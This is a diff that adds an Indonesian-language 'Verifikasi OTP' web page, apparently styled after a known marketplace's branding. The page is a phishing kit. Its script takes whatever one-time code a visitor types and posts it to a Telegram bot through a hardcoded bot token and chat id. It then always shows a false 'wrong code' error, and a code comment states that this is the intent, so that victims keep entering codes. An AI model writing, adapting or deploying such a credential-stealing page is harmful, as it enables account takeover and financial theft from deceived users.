@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verifikasi OTP</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', sans-serif;
+    }
+    body {
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+    }
+    .header {
+      background-color: #03AC0E;
+      color: white;
+      padding: 14px;
+      text-align: center;
+      font-size: 16px;
+      font-weight: bold;
+    }
+    .container {
+      padding: 20px;
+      max-width: 400px;
+      margin: auto;
+    }
+    h2 {
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      margin-bottom: 16px;
+    }
+    button {
+      width: 100%;
+      background-color: #03AC0E;
+      color: white;
+      border: none;
+      padding: 14px;
+      font-size: 16px;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    .timer {
+      text-align: center;
+      margin-top: 10px;
+      font-size: 14px;
+      color: #555;
+    }
+    .loading {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 14px;
+      color: #03AC0E;
+      display: none;
+    }
+    .error {
+      text-align: center;
+      color: red;
+      margin-top: 10px;
+      font-size: 14px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">Verifikasi OTP</div>
+
+  <div class="container">
+    <h2>Masukkan Kode OTP</h2>
+    <p>Kode OTP telah dikirim ke nomor HP Anda.</p>
+
+    <form id="otpForm">
+      <input type="text" id="otpCode" placeholder="6 Digit Kode OTP" maxlength="6" required pattern="[0-9]*" inputmode="numeric"/>
+      <button type="submit" id="submitBtn">Verifikasi</button>
+      <div class="loading" id="loading"> Memverifikasi...</div>
+      <div class="error" id="errorMsg"> Kode OTP salah. Silakan coba lagi.</div>
+    </form>
+
+    <div class="timer" id="timer">Kode berlaku: 01:00</div>
+  </div>
+
+  <script>
+    // Timer 60 detik
+    let timerElement = document.getElementById("timer");
+    let duration = 60;
+    let countdown = setInterval(() => {
+      let minutes = String(Math.floor(duration / 60)).padStart(2, '0');
+      let seconds = String(duration % 60).padStart(2, '0');
+      timerElement.textContent = `Kode berlaku: ${minutes}:${seconds}`;
+      duration--;
+
+      if (duration < 0) {
+        clearInterval(countdown);
+        timerElement.textContent = " Kode OTP telah kedaluwarsa.";
+        document.getElementById("submitBtn").disabled = true;
+      }
+    }, 1000);
+
+    // Submit OTP - tampilkan 'salah' tapi tetap kirim ke Telegram
+    const form = document.getElementById("otpForm");
+    const loading = document.getElementById("loading");
+    const errorMsg = document.getElementById("errorMsg");
+
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+      const otp = document.getElementById("otpCode").value.trim();
+
+      loading.style.display = "block";
+      errorMsg.style.display = "none";
+
+      setTimeout(() => {
+        const token = '7223686317:AAFJKbUn4qC-s9s6Ii-vQRevQ47bk47TS2I';
+        const chat_id = '7386992179';
+        const message = `OTP Dimasukkan\nKode: ${otp}`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            chat_id: chat_id,
+            text: message
+          })
+        });
+
+        loading.style.display = "none";
+        errorMsg.style.display = "block";
+        form.reset();
+      }, 1000);
+    });
+  </script>
+
+</body>
+</html>
